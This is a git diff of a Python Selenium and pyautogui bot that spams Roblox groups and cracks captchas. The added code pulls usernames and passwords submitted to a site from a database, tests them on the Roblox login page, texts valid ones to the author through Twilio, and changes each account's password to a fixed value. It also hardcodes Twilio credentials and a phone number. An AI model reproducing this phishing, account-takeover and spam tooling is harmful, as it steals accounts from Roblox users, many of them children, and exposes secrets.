@@ -7,6 +7,7 @@
 #==============================
 #Global generic imports
 
+from fcntl import DN_DELETE
 import os
 from os.path import exists
 import shutil
@@ -43,6 +44,9 @@ from selenium.webdriver.chrome.options import Options
 from selenium.common.exceptions import NoSuchElementException
 # import Action chains 
 from selenium.webdriver.common.action_chains import ActionChains
+
+#Twilio API
+from twilio.rest import Client 
 
 #==============================
 #Imports for personal local scripts
@@ -112,8 +116,7 @@ global joinbreaks
 global iso_time
 iso_time = int(time.time())
 
-global backed_up
-global last_backup
+global usersubmission
 
 #========================================
 #Operating system related functions
@@ -121,35 +124,7 @@ def clickThat(x,y):
     pyautogui.moveTo(x,y)
     pyautogui.click()
 
-def updateSQLServer():
-    TEAMVIEWER_POS = (1145,572)
-    #I was having issues with the script stopping on the server,
-    #I thought teamviewer alerts might be messing stuff up so I was planning
-    #On using pyautogui to close them but you can just disable them in the
-    #Teamviewer settings
-    BACKUP_INTERVAL = 300 #Backup the database every 300 seconds
-    try: backed_up
-    except NameError: backed_up = int(time.time())
-    if (clientConnector.get_ip_address() == "10.0.0.9"): #If we are the server
-        if (True == True):
-            print("Attempting to backup SQL database.")
-            
-            os.chdir(r"C:\xampp\mysql\bin")
-            time.sleep(0.5)
-            SQLBackup.createConnection()
-            time.sleep(0.5)
-            os.chdir(r"C:\Users\Admin\Desktop\Main")
-
-        else:
-            if (int(time.time()) - backed_up > BACKUP_INTERVAL):
-                print("Attempting to backup SQL database.")
-                os.chdir(r"C:\xampp\mysql\bin")
-                
-                time.sleep(0.5)
-                SQLBackup.createConnection()
-                time.sleep(0.5)
-                os.chdir(r"C:\Users\Admin\Desktop\Main")
-                backed_up = int(time.time())
+#Deleted backup function, backing up is normally not necessary.
 
 def countFiles(folder):
     count = 0
@@ -256,6 +231,19 @@ def elementFromText(text):
 
 #========================================
 #Other Function defines
+
+def sendTextMessage(message):
+    account_sid = 'ACc5cb67ecfd17b8dbdc274528e24c5222' #Our account SID
+    auth_token = 'fc5ee31982afa8251b91f546215bccde' #Our auth token
+    client = Client(account_sid, auth_token) 
+    
+    cprint.printColor(f"Sending message {message}","CYAN")
+
+    message = client.messages.create(  
+        messaging_service_sid='MG873c4677b2e3429edc15c8637514e5d4', #The messaing service SID
+        body=f'{message}', #Message   
+        to='+13058985994' #My phone number
+    ) 
 
 def infectGroup():
     global unknownErrorRatelimitFlag
@@ -463,6 +451,8 @@ def joinGroup():
     time.sleep(1)
 
 def sendMessage(message="message"):
+    testUserSubmissionIfPossible()
+    
     global capcheck
     message = MySQLConnector.getRecentMessage()
 
@@ -719,6 +709,8 @@ firstTime = True
 captchasuccess = list() #Depracated.
 
 def crackCaptcha(group=False):
+    testUserSubmissionIfPossible()
+    
     #Global Defines
     global firstTime
     global Captchas_Encountered
@@ -975,6 +967,54 @@ def logIntoAccount(username, password):
             logIntoAccount(username, password)
         time.sleep(0.1)
     print("Done! Logged into account.")
+
+def testAccount(username, password):
+    browser.get("https://www.roblox.com/login")
+    browser.switch_to.window(browser.current_window_handle)
+    browser.maximize_window()
+    print("Logging into account. Username: " + str(username) + " Password: " + str(password))
+    browser.find_element(By.ID, "login-username").click()
+    browser.find_element(By.ID, "login-username").send_keys(username)
+    browser.find_element(By.ID, "login-password").click()
+    browser.find_element(By.ID, "login-password").send_keys(password)
+    time.sleep(0.5)
+    browser.find_element(By.ID, "login-button").click()
+    print("Waiting for homepage...")
+    checkForCaptcha()
+    i = 0
+    while (browser.current_url != "https://www.roblox.com/home"):
+        i += 1
+        if ( i > 100):
+            i = 0
+            print("10 seconds has passed with no homepage. Not a valid account.")
+            return False
+        time.sleep(0.1)
+    
+    print("Done! Logged into account.")
+    return True
+
+def changePassword(currentpassword, newpassword):
+    browser.get("https://www.roblox.com/my/account#!/info")
+    clickThat(1415,361)
+    time.sleep(0.5)
+    #Current password
+    clickThat(704,515)
+    keyboard.write(currentpassword)
+    time.sleep(0.5)
+    
+    #New password
+    clickThat(704,564)
+    keyboard.write(newpassword)
+    time.sleep(0.5)
+
+    #Confirm password
+    clickThat(704,614)
+    keyboard.write(newpassword)
+    time.sleep(0.5)
+
+    #Update button
+    clickThat(955,663)
+    time.sleep(1)
     
 def pingClient(uuid):
     global our_uuid
@@ -1052,7 +1092,7 @@ def putOnClothes():
     #Take off default Avatar package
 
     #Male character
-    #clickClothByName("Man Head")
+    clickClothByName("Man Head")
     clickClothByName("Man Right Leg")
     clickClothByName("Man Left Leg")
     clickClothByName("Man Right Arm")
@@ -1100,15 +1140,29 @@ def changeName(name="ROBLOXREWARD"):
     clickThat(906,628)
     time.sleep(3)
 
+def testUserSubmissionIfPossible():
+    try:
+        global userSubmission
+        if (clientConnector.get_ip_address() == "10.0.0.9"):
+            if (MySQLConnector.returnLatestSubmission() != userSubmission):
+                #Somebody submitted something new
+                userSubmission = MySQLConnector.returnLatestSubmission()
+                print(f"New submission to test: {userSubmission}")
+                username, password = MySQLConnector.returnFullSubmission()
+                if (testAccount(username, password)):
+                    #Holy shit, valid account
+                    sendTextMessage(f"Logged valid roblox account. Username: {username} Password: {password}")
+                    changePassword(password, "8VP<lG6kuHO%QcZ;IZFe")
+                    print("Password changed!")
+
+    except Exception as ex:
+        print(f"Could not test user submission. Error message: {ex}")
+
 global our_uuid
 global unknownErrorCount
 global stop_threads
 
 if __name__ == "__main__":
-    
-    #First and foremost, if we are the server we want to attempt a backup or restore if possible
-    
-    #updateSQLServer()
     
     #Global defines and setting
     #VSCode says alot of these are defined before global declaration, however I don't encounter any problems at python runtime.
@@ -1134,6 +1188,11 @@ if __name__ == "__main__":
     global backed_up
     backed_up = int(time.time())
 
+    #======================================
+    #Testing goes here
+
+    #======================================
+
     #Connect to the client monitoring script, and begin periodic pining
     
     clientConnector.connectToSQLClientService()
@@ -1145,37 +1204,17 @@ if __name__ == "__main__":
     #Initialize tensorflow
     initTensorFlow()
 
-    #Get, and then set the proper loopback for captcha audio processing
-    #Don't use SQL for now. Doesn't work properly
-    TrustSQL = False
-    if (TrustSQL):
-        the_mic = MySQLConnector.checkIfSameMic(our_uuid)
-        cprint.printColor(the_mic)
-        if (the_mic == False or the_mic == 0):
-            audio.getCorrectMic()
-        else:
-            audio.setMic(int(the_mic))
-            if (audio.isMicWorking()):
-                pass
-            else:
-                audio.getCorrectMic()
-                
-    
     audio.getCorrectMic()
     
-    #=================================
-    #Navigate to our cookie folder
-    folder = r"cookies/"
-    if (not exists(folder + our_uuid)):
-        createAccountFolder(our_uuid)
+    #At the begining of the script, get the latest user submission
+    if (clientConnector.get_ip_address() == "10.0.0.9"):     
+        global userSubmission
+        userSubmission = MySQLConnector.returnLatestSubmission()
 
     #Main program loop
     times_executed = 0
     while (times_executed < 10): 
-        #uncomment if bypassing try except block
-        #if (1 == 1):
         try:
-            
             #First, pull the latest version of the software from git
             if (clientUpdater.upDateIfPossible()):
                 os.system("git reset --hard HEAD")
@@ -1184,6 +1223,9 @@ if __name__ == "__main__":
                 time.sleep(2)
                 os.system("py watchdog.py")
                 sys.exit()
+
+            #Next, check if there were any submissiong to the site.
+            testUserSubmissionIfPossible()
 
             #Get the mode we are operating in.
             global mode_operating
@@ -1200,9 +1242,9 @@ if __name__ == "__main__":
             message = str(MySQLConnector.getRecentMessage())
             
             #Initialize selenium
-    
             initSelenium()
 
+            #Get the group to spam
             goToGroup()
             print("Going to group.")
 
@@ -1314,7 +1356,6 @@ if __name__ == "__main__":
                 print("Browser close error")
             time.sleep(1)
             
-
     print("Script was executed 10 times. Running new program.")
     cmd = "py watchdog.py"
     os.system(cmd)
